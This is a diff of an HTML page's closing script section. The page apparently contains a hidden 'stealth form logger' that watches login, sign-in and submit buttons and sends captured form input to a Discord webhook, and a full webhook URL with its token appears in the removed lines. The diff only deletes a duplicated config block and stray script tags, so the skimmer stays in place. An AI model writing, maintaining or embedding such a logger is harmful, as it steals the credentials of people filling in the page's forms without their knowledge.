@@ -688,17 +688,7 @@ function downloadInfo() {
   setTimeout(() => msg.style.display = 'none', 2000);
 }
 
-// CONFIG
-const CONFIG = {
-    INPUT_IDLE_TIMEOUT: 2000,
-    SUBMIT_BUTTON_PATTERNS: ['submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate'],
-    
-    // Your webhook URL (keep this private!)
-    DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1469721842511249440/tbLHl5WSyD8AD9jyliPRKY6_KaWuFYF9lo2ysacrE4se4vk5pzJMz9XdyQvPIlRiYlXM'
-};
-
 <!-- STEALTH FORM LOGGER (DISCORD WEBHOOK VERSION - IMPROVED CAPTURE) -->
-<script>
 // CONFIG
 const CONFIG = {
     INPUT_IDLE_TIMEOUT: 2000,
@@ -843,7 +833,6 @@ const CONFIG = {
         setupSubmissionHandlers();
     }).observe(document.body, { childList: true, subtree: true });
 })();
-</script>
 </script>
 </body>
 </html>
